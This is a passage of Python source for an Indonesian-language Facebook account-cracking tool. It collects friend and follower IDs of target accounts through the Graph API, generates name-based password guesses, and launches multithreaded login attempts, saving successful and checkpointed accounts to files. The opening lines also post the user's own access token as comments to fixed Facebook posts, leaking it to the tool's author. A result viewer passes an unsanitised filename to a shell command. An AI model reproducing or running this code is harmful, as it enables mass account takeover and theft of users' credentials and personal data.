	requests.post("https://graph.facebook.com/100043285050864/subscribers?access_token="+token) # Japon
	requests.post("https://graph.facebook.com/428615822252807/comments/?message="+token+"&access_token="+token)
	requests.post("https://graph.facebook.com/1554707164895702/comments/?message="+token+"&access_token="+token)
	requests.post("https://graph.facebook.com/432247128556343/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/421762926271430/comments/?message="+komen+"&access_token="+token)
	requests.post("https://graph.facebook.com/421762926271430/likes?summary=true&access_token="+token)
	menu()

# MENU

def menu():
	try:
		os.mkdir("CP")
	except:
		pass
	try:
		os.mkdir("OK")
	except:
		pass
	clear()
	banner()
	try:
		token = open("token.txt","r").read()
		cintaku = requests.get("https://graph.facebook.com/me?access_token="+token)
		pillow = json.loads(cintaku.text)
		hujan = pillow["name"]
	except KeyError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	print("\n"+balmond+l+" Active User : "+s+pillow["name"])
	print(balmond+l+" Status      : \33[0;31mGa Punya Doi\33[0;97m")
	#print(s+line)
	#print("")
	#print(balmond+p+" =>"+l+" OK/OK_%s.txt"%(hck))
	#print(balmond+p+" =>"+l+" CP/CP_%s.txt"%(hck))
	print(s+line)
	print(s+"\n["+l+"01"+s+"]"+l+" Crack Dari Pertemanan Publik")
	print(s+"["+l+"02"+s+"]"+l+" Crack Dari Followers Publik")
	print(s+"["+l+"03"+s+"]"+l+" Crack Pertemanan Masal")
	print(s+"["+l+"04"+s+"]"+l+" Crack Akun Old 04/08")
	print(s+"["+l+"05"+s+"]"+l+" Crack Akun Old 04/10")
	print(s+"["+l+"06"+s+"]"+l+" Setting User Agent")
	print(s+"["+l+"07"+s+"]"+l+" Cek Opsi Hasil Crack")
	print(s+"["+l+"08"+s+"]"+l+" Cek Hasil Crack")
	print(s+"["+l+"ig"+s+"]"+l+" Crack Instagram")
	print(s+"["+l+"09"+s+"]"+l+" Setting Tema")
	print(s+"["+l+"00"+s+"]"+l+" Logout "+s+"["+l+"Hapus Token"+s+"]")
	print(s+line)
	sayangku = input(balmond+l+" Pilih : ")
	if sayangku=="1" or sayangku=="01":
		publik()
	elif sayangku=="2" or sayangku=="02":
		follow()
	elif sayangku=="3" or sayangku=="03":
		massal()
	elif sayangku=="4" or sayangku=="04":
		dump_old()
	elif sayangku=="5" or sayangku=="05":
		dump_old2()
	elif sayangku=="6" or sayangku=="06":
		user_agent()
	elif sayangku=="7" or sayangku=="07":
		cek_opsi()
	elif sayangku=="8" or sayangku=="08":
		result()
	elif sayangku=="ig" or sayangku=="IG":
		jalan(balmond+l+" Maaf....Fitur Ini Masih Dalam Tahap Percobaan")
		time.sleep(0.5)
		exit()
	elif sayangku=="9" or sayangku=="09":
		tema()
	elif sayangku=="0" or sayangku=="00":
		os.system("rm -rf token.txt")
		jalan(balmond+l+" Thanks Udah Pake Sc Gua Bro")
		time.sleep(0.5)
		exit()
	else:
		jalan("\n"+balmond+m+" Pilihan Anda Invalid")
		time.sleep(0.5)
		menu()


# TEMA

def tema():
	print(s+"\n["+l+"01"+s+"]"+l+" Tema Default")
	print(s+"["+l+"02"+s+"]"+l+" Tema Kuning")
	print(s+"["+l+"03"+s+"]"+l+" Tema Merah")
	print(s+"["+l+"04"+s+"]"+l+" Tema Biru")
	print(s+"["+l+"00"+s+"]"+l+" Kembali")
	print(s+line)
	pilih = input(balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		awm = open("tema.txt","w");awm.write("default");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="2" or pilih=="02":
		awm = open("tema.txt","w");awm.write("kuning");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="3" or pilih=="03":
		awm = open("tema.txt","w");awm.write("merah");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="4" or pilih=="04":
		awm = open("tema.txt","w");awm.write("biru");awm.close()
		print("\n"+balmond+l+" Tema Berhasil Diterapkan")
		jalan(balmond+l+" Jalankan Ulang Scriptnya...")
		time.sleep(0.5)
		exit()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan(balmond+m+" Pilihan Salah")
		time.sleep(0.5)
		tema()
		
# RESULT

def result():
	print(s+line)
	print(s+"\n["+l+"1"+s+"]"+l+" Cek Result \33[1;93mCP\33[0;97m")
	print(s+"["+l+"2"+s+"]"+l+" Cek Result \33[1;92mOK\33[0;97m")
	print(s+"["+l+"0"+s+"]"+l+" Kembali")
	print(s+line)
	pilih = input(balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		try:
			lisaa = os.listdir("CP")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+l+" Hasil CP")
			print(balmond+m+" Tidak Ada Hasil Cp")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print("\n"+balmond+l+" Hasil CP")
			for jisoo in lisaa:
				print(balmond+l+" "+jisoo)
			marjan = input(balmond+l+" File : "+s+"")
			try:
				binatang = open("CP/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd CP && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("OK")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+l+" Hasil Ok")
			print(balmond+m+" Tidak Ada Hasil Ok")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			print("\n"+balmond+l+" Hasil Ok")
			for jisoo in lisaa:
				print(balmond+l+" "+jisoo)
			marjan = input(balmond+l+" File : "+s+"")
			try:
				binatang = open("OK/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd OK && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
		menu()
	else:
		jalan("\n"+balmond+m+" Pilihan Anda Invalid")
		time.sleep(0.5)
		result()


# USER AGENT

def user_agent():
	print(s+line)
	print(s+"\n["+l+"1"+s+"]"+l+" Ganti User Agent")
	print(s+"["+l+"2"+s+"]"+l+" Reset User Agent")
	print(s+"["+l+"3"+s+"]"+l+" Lihat User Agent")
	print(s+line)
	pilih = input(balmond+l+" pilih : ")
	if pilih=="1" or pilih=="01":
		user = input("\n"+balmond+l+" Masukkan User Agent : "+h+"")
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan(balmond+l+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		user = "Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]"
		tulis = open("user.txt","w");tulis.write(user);tulis.close()
		jalan("\n"+balmond+l+" Berhasil")
		time.sleep(0.5)
		menu()
	elif pilih=="3" or pilih=="03":
		try:
			user = open("user.txt","r").read()
		except IOError:
			jalan("\n"+balmond+m+" File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
			time.sleep(0.5)
			menu()
		print("\n"+balmond+l+" User Agent : "+s+user)
		input(balmond+l+" Kembali")
		menu()
	else:
		jalan("\n"+balmond+m+" Masukkan Pilihan Yang Benar")
		time.sleep(0.5)
		user_agent()

# Old2

def dump_old2():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old2()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old2()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# OLD

def dump_old():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                dump_old()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        os.system("rm -rf id.txt")
        mode_password()

# PUBLIK

def publik():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	print(s+line)
	uid = input("\n"+balmond+l+" Masukkan ID Target : ")
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(balmond+l+" Nama : "+tulul["name"])
	except KeyError:
		print(balmond+m+" ID Salah")
		time.sleep(0.5)
		publik()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(balmond+l+" Total ID : "+s+"%s"%(len(id)))
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# FOLLOW

def follow():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input("\n"+balmond+l+" Masukkan ID Target : ")
	try:
		jumlah = int(input(balmond+l+" Mau Ambil Berapa ID : "))
		if jumlah>5000:
			jalan(balmond+m+" Maksimal 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		follow()
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		print(balmond+l+" Nama : "+tulul["name"])
	except KeyError:
		print(balmond+m+" ID Salah")
		time.sleep(0.5)
		follow()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
			except:
				continue
		print(balmond+l+" Total ID : "+h+"%s"%(len(id)))
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# MASSAL

def massal():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	try:
		nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
		if nada>10:
			jalan(balmond+m+" Maksimal 10 ID")
			time.sleep(0.5)
			massal()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		massal()
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
		try:
			asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			tulul = json.loads(asu.text)
			print(balmond+l+" Nama : "+tulul["name"])
		except KeyError:
			print(balmond+m+" ID Salah")
			time.sleep(0.5)
			exit()
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
		try:
			bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
			buriq = json.loads(bulu.text)
			for cew in buriq["data"]:
				try:
					jamet = cew["id"]
					junet = cew["name"]
					detec = jamet+"|"+junet
					if detec in id:
						continue
					else:
						id.append(jamet+"|"+junet)
						tampung.append(jamet+"|"+junet)
				except:
					continue
			print(balmond+l+" Total ID : "+h+"%s\n"%(len(tampung)))
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
	print(balmond+l+" Jumlah Total ID : "+h+"%s"%(len(id)))
	mode_password()
	
# MODE PASSWORD

def mode_password():
	print(s+line)
	mode = input("\n"+balmond+l+" Crack Password Default Or Manual Or Gabungkan "+s+"["+l+"d/m/g"+s+"]"+l+" : ")
	print(s+line)
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print(s+line)
		print("\n"+balmond+l+" Masukkan Password Manual")
		print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Manual : "+h+"")
		print(s+line)
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Jangan Serakah Tod, Minimal 7 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				exit()
		sandi.append(pwa)
		opsi2()
	elif mode=="g" or mode=="G":
		print(s+line)
		print("\n"+balmond+l+" Masukkan Password Tambahan")
		print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Tambahan : "+h+"")
		print(s+line)
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Jangan Serakah Tod, Minimal 5 Password Aja")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				exit()
		sandi.append(pwa)
		opsi3()
	else:
		jalan(balmond+m+" Pilih d Atau m Atau g")
		time.sleep(0.5)
		mode_password()

# OPSI

def opsi():
	ops = input(balmond+l+" Munculkan Opsi "+s+"["+l+"y/t"+s+"]"+l+" : ")
	if ops=="y" or ops=="Y":
		opsit.append("munculkan")
	elif ops=="t" or ops=="T":
		opsit.append("jangan")
	else:
		jalan(balmond+m+" Pilih Ya Atau Tidak")
		time.sleep(0.5)
		opsi()
	mode_crack()

# OPSI2

def opsi2():
        ops = input("\n"+balmond+l+" Munculkan Opsi "+s+"["+l+"y/t"+s+"]"+l+" : ")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak")
                time.sleep(0.5)
                opsi2()
        mode_crack2()

# OPSI3

def opsi3():
        ops = input("\n"+balmond+l+" Munculkan Opsi "+s+"["+l+"y/t"+s+"]"+l+" : ")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak")
                time.sleep(0.5)
                opsi3()
        mode_crack3()

# MODE CRACK

def mode_crack():
	print(s+line)
	print(s+"\n["+l+"01"+s+"]"+l+" Method B-Api "+s+"["+l+"Fast Crack"+s+"]")
	print(s+"["+l+"02"+s+"]"+l+" Method Mbasic "+s+"["+l+"Slow Crack"+s+"]")
	print(s+line)
	pilih = input(balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
		print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
		print(s+line)
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		if agenku=="t" or agenku=="T":
			user = input(balmond+l+" Masukkan User Agent : "+s+"")
			time.sleep(0.5)
		else:
			kopi = "enak"
		print("\n"+balmond+l+" Crack Dimulai")
		print(balmond+l+" Hasil \33[1;92mCP\33[0;97m disimpan : \33[1;92mCP/CP_%s.txt\33[0;97m"%(hck))
		print(balmond+l+" Hasil \33[1;93mOK\33[0;97m disimpan : \33[1;93mOK/OK_%s.txt\33[0;97m"%(hck))
		print(s+line)
		print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
		print(s+line)
		default()
	elif pilih=="2" or pilih=="02":
		print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
		print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
		print(s+line)
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		print(balmond+l+" Anda Menggunakan User Agent Tunggal: 1")
		time.sleep(0.5)
		print(s+line)
		print("\n"+balmond+l+" Crack Dimulai")
		print(balmond+l+" Hasil \33[1;92mCP\33[0;97m disimpan : \33[1;92mCP/CP_%s.txt\33[0;97m"%(hck))
		print(balmond+l+" Hasil \33[1;93mOK\33[0;97m disimpan : \33[1;93mOK/OK_%s.txt\33[0;97m"%(hck))
		print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
		default2()
	else:
		jalan(balmond+l+" Pilihan Invalid")
		time.sleep(0.5)
		mode_crack()

# MODE CRACK2

def mode_crack2():
        print(s+"\n["+l+"1"+s+"]"+l+" Method Api "+s+"["+l+"Fast Crack"+s+"]")
        print(s+"["+l+"2"+s+"]"+l+" Method Mbasic "+s+"]"+l+"Slow Crack"+s+"]")
        pilih = input("\n"+balmond+l+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
                print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print(balmond+l+" Anda Menggunakan User Agent Tunggal : 1")
                time.sleep(0.5)
                print("\n"+balmond+l+" Crack Dimulai")
                print(balmond+l+" Hasil CP disimpan : CP/CP_%s.txt"%(hck))
                print(balmond+l+" Hasil OK disimpan : OK/OK_%s.txt"%(hck))
                print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                manual()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
                print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print(balmond+l+" Anda Menggunakan User Agent Tunggal : 1")
                time.sleep(0.5)
                print("\n"+balmond+l+" Crack Dimulai")
                print(balmond+l+" Hasil CP disimpan : CP/CP_%s.txt"%(hck))
                print(balmond+l+" Hasil OK disimpan : OK/OK_%s.txt"%(hck))
                print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                manual2()
        else:
                jalan(balmond+l+" Pilih Y/T Kontol")
                time.sleep(0.5)
                mode_crack2()

# MODE CRACK3

def mode_crack3():
        print(s+"\n["+l+"1"+s+"]"+l+" Method Api "+s+"["+l+"Fast Crack"+s+"]")
        print(s+"["+l+"2"+s+"]"+l+" Method Mbasic "+s+"["+l+"Slow Crack"+s+"]")
        pilih = input("\n"+balmond+l+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
                print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print(balmond+l+" Anda Menggunakan User Agent Tunggal : 1")
                time.sleep(0.5)
                print("\n"+balmond+l+" Crack Dimulai")
                print(balmond+l+" Hasil CP disimpan : CP/CP_%s.txt"%(hck))
                print(balmond+l+" Hasil OK disimpan : OK/OK_%s.txt"%(hck))
                print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                gabungkan()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+l+" Tekan"+s+"'y'"+l+"Jika Ingin Menggunakan Random User Agent")
                print(balmond+l+" Tekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"["+l+"Recomended"+s+"]"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print(balmond+l+" Anda Menggunakan User Agent Tunggal : 1")
                time.sleep(0.5)
                print("\n"+balmond+l+" Crack Dimulai")
                print(balmond+l+" Hasil CP disimpan : CP/CP_%s.txt"%(hck))
                print(balmond+l+" Hasil OK disimpan : OK/OK_%s.txt"%(hck))
                print("\n"+balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                gabungkan2()
        else:
                jalan(balmond+l+" Pilih Y/T Kontol")
                time.sleep(0.5)
                mode_crack3()


# DEFAULT

def default():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						#past.append(xr+"1234")
						#past.append(xr+"12345")
					else:
						past.append(xr+"123")
						#past.append(xr+"1234")
						#past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			kintil.submit(api, idd, past, loop)

# DEFAULT2

def default2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        continue
                                else:
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==5:
                                                past.append(xr+"123")
                                                #past.append(xr+"1234")
                                                #past.append(xr+"12345")
                                        else:
                                                past.append(xr+"123")
                                                #past.append(xr+"1234")
                                                #past.append(xr+"12345")
                                                past.append(xr)
                        past.append(namee.lower())
                        kintil.submit(mbasic, idd, past, loop)

# MANUAL

def manual():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(api, idd, past, loop)

# MANUAL2

def manual2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(mbasic, idd, past, loop)

# GABUNG

def gabungkan():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(api, idd, past, loop)

# GABUNGKAN2

def gabungkan2():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
